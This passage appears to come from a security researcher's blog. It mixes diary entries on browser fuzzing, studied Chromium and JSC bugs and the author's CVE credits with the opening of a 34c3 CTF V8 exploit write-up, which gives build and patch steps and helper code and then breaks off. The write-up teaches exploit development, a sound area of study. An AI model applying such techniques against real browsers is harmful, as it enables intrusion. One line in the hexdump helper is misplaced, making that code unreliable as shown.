id="2018-12-27-31"><a href="#2018-12-27-31" class="headerlink" title="2018-12-27-31"></a>2018-12-27-31</h2><ol><li>35c3 video和日程整理<br><a href="https://media.ccc.de" target="_blank" rel="noopener">https://media.ccc.de</a><br><a href="https://fahrplan.events.ccc.de/congress/2018/Fahrplan/schedule/3.html" target="_blank" rel="noopener">https://fahrplan.events.ccc.de/congress/2018/Fahrplan/schedule/3.html</a></li><li><p>开始fuzz之旅<br>From Zero to Zero Day-Jonathan Jacobi<br><a href="https://www.youtube.com/watch?v=xp1YDOtWohw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=xp1YDOtWohw</a><br>Attacking Chrome IPC-nedwill<br><a href="https://www.youtube.com/watch?v=39yPeiY808w" target="_blank" rel="noopener">https://www.youtube.com/watch?v=39yPeiY808w</a><br>The Layman’s Guide to Zero-Day Engineering<br><a href="https://www.youtube.com/watch?v=WbuGMs2OcbE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=WbuGMs2OcbE</a></p></li><li><p>简述一下From Zero to Zero Day里我觉得有趣的东西</p><ul><li>基础很重要，其中最重要的就是c/c++/os(或者你具体研究的那个系统，比如浏览器)internal/能用python或者其他语言coding来实现自己的想法。<br>最后一点我觉得<a href="https://ktkitty.github.io/" target="_blank" rel="noopener">KT</a>师傅搞的非常棒，可惜我太菜了。</li><li>通过CTF或者具体的简单的小软件来学习关于漏洞的基础知识，不要害怕失败，从其他人的解法中你依然能学到非常多的东西，这里建议follow defcon预选赛和defcon的赛题，其他的可以不做，没有什么意义。<br>推荐一个系列教程<br><a href="http://liveoverflow.com/capture_the_flag/index.html" target="_blank" rel="noopener">http://liveoverflow.com/capture_the_flag/index.html</a><br><a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w" target="_blank" rel="noopener">https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w</a><br>但是要注意，不要在“浅水区”待太久，你只要确保自己有继续进行研究的能力即可，我觉得半年可以完成这些事情，然后继续往下。</li><li>接下来需要的就是eat sleep pwn,repeat;2333<br>这里的建议是，当你掌握了一些trick和思路之后，你可以尝试去理解真实的漏洞，理解其中的pattern<br>比如你可以去看google project zero提交的漏洞，并研究他们。</li><li>后面的部分是一个有趣的漏洞和它的exp，不过这部分其实有点无聊。</li></ul></li></ol><p>我似乎懂了些什么有趣的东西，从jsc开始实践。why not v8?it’s difficult…）</p><ol><li>继续简述一下Attacking Chrome IPC里的一些我觉得关键的地方<ul><li>练习代码审计<ol><li>拿到一个已经存在的漏洞报告</li><li>知道漏洞大概发生在什么地方，或者是什么模块，不要去看完整的漏洞描述，尝试去发现漏洞。</li><li>如果你失败了，看一下漏洞报告，并且去总结你错过了什么地方。</li><li>重复这个过程，直到你觉得OK为止。</li></ol></li><li>练习fuzz<ol><li>请确定自己有充分的审计上的练习</li><li>拿到一个漏洞，通过自己写fuzz去trigger它。</li></ol></li><li>protobuf-mutator+libfuzzer</li></ul></li></ol><p>年终的最后几天，是一边睡觉一边和这些有趣的talk度过的，还看了35c3的v8题目，有一个逃逸分析的点想了半个月没想到，是我蠢了。<br>有趣的挑战，明年要继续努力了，夯实基础，砥砺前行。<br>一个人久了真的很累呀，新的一年，找个朋友一起住，一起打打游戏，搞搞研究，开开心~熬过这半年就好了。</p><h2 id="2019-1-1-2"><a href="#2019-1-1-2" class="headerlink" title="2019-1-1-2"></a>2019-1-1-2</h2><ol><li>写一个能跑的js fuzz，然后慢慢调。<br>lighthouse+lcov–&gt;feedback<br>dharma–&gt;语法生成<br>将两部分结合一下就是一个能跑的js fuzz，写代码真麻烦2333<br>今天大概看了看dharma的语法描述文件怎么写，想想要写一堆语法描述就麻烦。。</li><li>youtube上看到一个小系列The Art of Fuzzing，upx是真的很好fuzz。。很快一堆crash<br>然后是google的libfuzzerTutorial很有趣。<br><a href="https://github.com/google/fuzzer-test-suite/blob/master/tutorial/libFuzzerTutorial.md" target="_blank" rel="noopener">https://github.com/google/fuzzer-test-suite/blob/master/tutorial/libFuzzerTutorial.md</a></li><li>所以今天大概最后就是再看了一下webkid。</li></ol><h2 id="2019-1-3-9"><a href="#2019-1-3-9" class="headerlink" title="2019-1-3-9"></a>2019-1-3-9</h2><ol><li>研究safari jsc<br>safari JIT exploit<br><a href="https://www.youtube.com/watch?v=bqehb-YZ9jo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bqehb-YZ9jo</a><br><a href="https://share.weiyun.com/5IJZPBp" target="_blank" rel="noopener">https://share.weiyun.com/5IJZPBp</a><br>fuzz book<br><a href="https://www.fuzzingbook.org" target="_blank" rel="noopener">https://www.fuzzingbook.org</a><br>pizlo jsc<br><a href="http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf</a><br><a href="http://www.filpizlo.com/" target="_blank" rel="noopener">http://www.filpizlo.com/</a><br>其他乱七八糟的paper<br><a href="https://llvm.org/devmtg/2014-10/Slides/Trick-FTL.pdf" target="_blank" rel="noopener">https://llvm.org/devmtg/2014-10/Slides/Trick-FTL.pdf</a><br>Array Bounds Check Elimination for the Java HotSpotTM Client Compiler<br><a href="http://www.ssw.uni-linz.ac.at/Research/Papers/Wuerthinger07/Wuerthinger07.pdf" target="_blank" rel="noopener">http://www.ssw.uni-linz.ac.at/Research/Papers/Wuerthinger07/Wuerthinger07.pdf</a></li></ol><h2 id="2019-1-12"><a href="#2019-1-12" class="headerlink" title="2019-1-12"></a>2019-1-12</h2><ol><li>研究编译原理<br><a href="https://www.bilibili.com/video/av17669734/?p=77" target="_blank" rel="noopener">https://www.bilibili.com/video/av17669734/?p=77</a><br>刷完视频刷书，重新看感觉有新收获，得到的认知就是：</li></ol><ul><li>要知道你看的这个东西是用来做什么的，解决什么问题的</li><li>它具体可能是怎么实现的，js引擎里是怎么实现的</li><li>modern compiler和书里的不同之处</li></ul><h2 id="2019-4-2"><a href="#2019-4-2" class="headerlink" title="2019-4-2"></a>2019-4-2</h2><p>不写日记感觉不能梳理自己每天在干嘛，就写一下好了。</p><ol><li><p>学习saelo的两个spiderMonkey漏洞<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1791" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1791</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1810" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1810</a></p></li><li><p>学习saelo的jsc漏洞<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1753" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1753</a><br>关于ArrayWithSlowPutStorage</p></li></ol><h2 id="2019-4-24"><a href="#2019-4-24" class="headerlink" title="2019-4-24"></a>2019-4-24</h2><ol><li>在漫长的时间里无所作为，开始反省自己遇到的瓶颈到底是什么，除了chakra，其他浏览器的JIT优化漏洞总是越来越少了。<br>首先是在我花了很长时间的浏览器JIT优化方面，已经很久没有chrome v8的有趣漏洞出现了，我分析了龚广天府cup的漏洞，以及最近的那个FileReader的漏洞，有趣的是，它们的漏洞pattern都是，在处理超长的数据或者其他东西的时候，没有处理好，导致畸形数据或者错误的程序执行逻辑产生，但是并不太好迅速的针对进行审计。<br>我依然更感兴趣在优化漏洞上，尤其是大宝发现的那些chakra漏洞，非常有趣，但是v8里没有chakra那些奇奇怪怪的设计。</li><li>fuzz依然是我更感兴趣的方向，但是单纯js fuzz已经没什么前途了。。<br>和Atum这样的顶级二进制选手聊过之后，感觉自己在更多的软件实现，尤其是内核的一些东西上的欠缺，要更理解这些系统机制以及如何操纵它们才可以。<br><a href="https://github.com/A7um/syscallhook" target="_blank" rel="noopener">https://github.com/A7um/syscallhook</a><br>强的令人发指。。<br>通过顶级CTF来迭代知识依然是一个好的选择，抛弃掉无用的heap相关的赛题，剩下的题目质量依然很高很好，值得学习，尤其是c3 ctf。</li><li>挖了这么久漏洞，终于明白了，攻击面和结合攻击面去fuzz，是最合适的挖洞方法，剩下就是code smell。</li><li>我觉得逻辑漏洞是一个很有趣的方向，不知道有没有大佬带我玩，逆向一些国产小软件的进程间通信来找找漏洞啥的。</li></ol><h2 id="2019-4-25"><a href="#2019-4-25" class="headerlink" title="2019-4-25"></a>2019-4-25</h2><p>最近分析的比较有趣的浏览器漏洞。<br>Issue 1793: Chrome: Integer overflow in NewFixedDoubleArray<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1793" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1793</a><br>CVE-2019-5786 FileReader UaF<br>OOB Write in ValueDeserializer::ReadDenseJSArray (Tian Fu Cup）<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=905940" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=905940</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906313" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=906313</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=914731" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=914731</a><br>现在看这些漏洞，有一些有趣的code smell了。浏览器对我来说慢慢的也已经变成了一个看得懂的东西呢，不过离挖到洞还早。</p><h2 id="2019-6-5"><a href="#2019-6-5" class="headerlink" title="2019-6-5"></a>2019-6-5</h2><p>我的CVE。</p><ol><li><a href="https://chromereleases.googleblog.com/2019/06/stable-channel-update-for-desktop.html" target="_blank" rel="noopener">https://chromereleases.googleblog.com/2019/06/stable-channel-update-for-desktop.html</a><br>[$TBD][950328] Medium CVE-2019-5831: Incorrect map processing in V8. Reported by yngwei(JiaWei, Yin) of IIE Varas and <strong>sakura of Tecent Xuanwu Lab</strong> on 2019-04-07</li><li><a href="https://support.apple.com/en-us/HT210123" target="_blank" rel="noopener">https://support.apple.com/en-us/HT210123</a><br>CVE-2019-8583: <strong>sakura of Tencent Xuanwu Lab</strong>, and dwfault working at ADLab of Venustech<br>从开始搞浏览器到现在，差不多就是一年，去掉一些零零碎碎的做其他事情的时间，可能大概半年多一些，我也有自己的google和apple致谢了。<br>刚刚好在我毕业答辩期间收到编号，可能是我的毕业礼物了，thanks~哈哈<br>既然发了日记就说一下我的理解，在实习的这一年里认识了非常多的大佬，我在xuanwu lab的导师sky还有lw和明月师傅他们，r3kapig的Ne0和Atum他们，还有和我一起讨论学习的yngwei和dwfault,jessica他们，都给了我非常多的帮助和启发。<br>在推特上面也认识了不少的朋友，以及follow了很多大佬，尤其是project zero的saelo，跟进最新的漏洞并分析，研究漏洞挖掘的新技术新手法，不断提升自己。<br>所以学习这件事情，最重要的就是开阔视野，你以为的有用的东西并不真的有用，实际的漏洞挖掘考察的是对目标的理解和深度，并不是说和简单的CTF pwn一样，只是hack game，ctf非常有意义，但是也要认识到这一点，真正决定你能不能挖到漏洞的，永远是对目标软件的理解，并没有什么特别特别通用的知识。<br>Just spend a long time learning and doing it, you will get better.</li></ol><h2 id="2019-6-6"><a href="#2019-6-6" class="headerlink" title="2019-6-6"></a>2019-6-6</h2><p>最近这几天一直在想漫长的一个月做点什么，嗯，没错，我毕业了，毕业答辩结束，应该没什么幺蛾子的话，会顺利的会玄武上班。<br>然后就有点迷茫，暂时，嗯，暂时不太想继续肝JS engine了，花了太久，产出有限，希望做些有趣的事情，嗯，当然fuzz还会继续跑。<br>想学的东西有点多，我是出于兴趣在搞技术的，有些复杂的东西其实不太想牵扯到其中，我喜欢挖到漏洞，喜欢和厉害的人交流技术弥补不足。<br>还想学更多有趣的东西。</p><h2 id="2019-6-23"><a href="#2019-6-23" class="headerlink" title="2019-6-23"></a>2019-6-23</h2><ol><li>拿到了毕业证和学位证，准备入职了，列一下计划。</li><li>和@aSiagaming一起解决gctf chrome sandbox escape pwn.<br><a href="https://capturetheflag.withgoogle.com/#challenges/sandbox-monochromatic" target="_blank" rel="noopener">https://capturetheflag.withgoogle.com/#challenges/sandbox-monochromatic</a><br>题目出处应该是这个issue。<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1755</a><br>现在需要补充大量的基础知识。</li><li>复习v8 JIT相关的知识和漏洞，准备一个share.</li><li>开始打hacker101的ctf，练习一些web的基础知识。</li><li>每天坚持锻炼和饮食。</li></ol><h2 id="2019-6-28"><a href="#2019-6-28" class="headerlink" title="2019-6-28"></a>2019-6-28</h2><ol><li>上班第一周，全在搬砖，一点漏洞研究的事情没做，粗略的翻了下ned的议题还有chrome mojo。</li><li>思想还需要转变，毕竟上班就是这样，leader让你干什么你就得干什么，哪怕你是造火箭的，也得来拧螺丝钉。</li><li>虽然很想挖洞，也觉得工作和自己想象中不一样，不够帅，但是，还是要积极调整啊。</li><li>我的第二个v8 cve可能要发下来了，开心。</li></ol><h2 id="2019-7-3"><a href="#2019-7-3" class="headerlink" title="2019-7-3"></a>2019-7-3</h2><ol><li>爬虫写的越来越快了。。我可以写篇博客讲爬虫了。。</li><li><p>学习natalie的挖洞思路，先把webrtc搭起来了。<br><a href="https://github.com/googleprojectzero/Street-Party/blob/master/WebRTC/record.patch" target="_blank" rel="noopener">https://github.com/googleprojectzero/Street-Party/blob/master/WebRTC/record.patch</a><br>natalie的编译脚本有点问题，改成下面这样就OK了,学习了一下谷歌的构建链。<br><a href="https://blog.csdn.net/Vincent95/article/details/70849035" target="_blank" rel="noopener">https://blog.csdn.net/Vincent95/article/details/70849035</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rtc_static_library(&quot;call&quot;) &#123;</span><br><span class="line">  sources = [</span><br><span class="line">    &quot;call.cc&quot;,</span><br><span class="line">    &quot;call_factory.cc&quot;,</span><br><span class="line">    &quot;call_factory.h&quot;,</span><br><span class="line">    &quot;degraded_call.cc&quot;,</span><br><span class="line">    &quot;degraded_call.h&quot;,</span><br><span class="line">    &quot;flexfec_receive_stream_impl.cc&quot;,</span><br><span class="line">    &quot;flexfec_receive_stream_impl.h&quot;,</span><br><span class="line">    &quot;receive_time_calculator.cc&quot;,</span><br><span class="line">    &quot;receive_time_calculator.h&quot;,</span><br><span class="line">    &quot;../test/rtp_file_writer.cc&quot;,</span><br><span class="line">    &quot;../test/rtp_file_writer.h&quot;,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  deps = [</span><br><span class="line">    &quot;../rtc_base:rtc_json&quot;,</span><br></pre></td></tr></table></figure></li><li><p>调试分析漏洞。</p></li></ol><h2 id="2019-7-8"><a href="#2019-7-8" class="headerlink" title="2019-7-8"></a>2019-7-8</h2><ol><li>这周想给自己的漏洞写一下利用,CVE-2019-5831,issue-950328，这个洞是我回学校忙毕业的时候出的，一直没空仔细看，怎么说呢，从回学校毕业之后到现在，也有好几个月了，一直没有调试分析chrome漏洞了，其实对引擎的理解就还不够深刻，漏洞基本上是fuzz出的，这段时间也一直在考虑和去改fuzz，不过和大佬聊过之后觉得，挖漏洞这件事情，必须经常反思为什么别人能挖到，自己没挖到，是这个点没看到么，如果不是，那是什么原因。<br>嗯，是我看的还不够仔细，那就从自己的漏洞开始搞吧。</li></ol>]]></content>
      
      <categories>
          
          <category> 学习日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sakuraのsakura </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Attack TurboFan Debug write-up</title>
      <link href="/2019/07/08/attak_turbofan/"/>
      <url>/2019/07/08/attak_turbofan/</url>
      <content type="html"><![CDATA[<p>issue-944062<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-08-064357.png" alt=""></p><ol><li>inferring the receiver maps<ul><li>遍历effect chain</li><li>搜索有关receiver的map的信息</li><li>可能的结果<ul><li>没有map信息被发现</li><li>Recevier maps可以被充分信任</li><li>Recevier maps可能已经改变</li></ul></li></ul></li><li>计算elements kind</li><li>使用elements kind</li></ol>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>34c3 v9 writeup</title>
      <link href="/2019/04/29/v9/"/>
      <url>/2019/04/29/v9/</url>
      <content type="html"><![CDATA[<h1 id="34c3-v9-writeup"><a href="#34c3-v9-writeup" class="headerlink" title="34c3 v9 writeup"></a>34c3 v9 writeup</h1><p>很久之前做的了，和*CTF那题差不多，顺便就发出来。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/saelo/v9" target="_blank" rel="noopener">https://github.com/saelo/v9</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir v9 &amp;&amp; cd v9</span><br><span class="line">fetch v8 &amp;&amp; cd v8           # see https://github.com/v8/v8/wiki/Building-from-Source</span><br><span class="line">git checkout 6.3.292.48</span><br><span class="line">gclient sync</span><br><span class="line">patch -p1 &lt; /path/to/v9.patch</span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="工具类准备"><a href="#工具类准备" class="headerlink" title="工具类准备"></a>工具类准备</h3><p>这部分就是一些可复用的代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.padLeft =</span><br><span class="line"><span class="built_in">Number</span>.prototype.padLeft = <span class="function"><span class="keyword">function</span>(<span class="params">total, pad</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">Array</span>(total).join(pad || <span class="number">0</span>) + <span class="keyword">this</span>).slice(-total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the hexadecimal representation of the given byte array.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexlify</span>(<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        <span class="comment">//print(bytes[i].toString(16));</span></span><br><span class="line">        res.push((<span class="string">'0'</span> + bytes[i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.join(<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the binary data represented by the given hexdecimal string.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unhexlify</span>(<span class="params">hexstr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hexstr.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Invalid hex string"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(hexstr.length / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; hexstr.length; i += <span class="number">2</span>)</span><br><span class="line">        bytes[i/<span class="number">2</span>] = <span class="built_in">parseInt</span>(hexstr.substr(i, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexdump</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="string">'undefined'</span>)</span><br><span class="line">        data = <span class="built_in">Array</span>.from(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> lines = [];</span><br><span class="line">        <span class="keyword">var</span> chunk = data.slice(i, i+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> parts = chunk.map(hex);</span><br><span class="line">        <span class="keyword">if</span> (parts.length &gt; <span class="number">8</span>)</span><br><span class="line">            parts.splice(<span class="number">8</span>, <span class="number">0</span>, <span class="string">' '</span>);</span><br><span class="line">        lines.push(parts.join(<span class="string">' '</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lines.join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplified version of the similarly named python module.</span></span><br><span class="line"><span class="keyword">var</span> Struct = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Allocate these once to 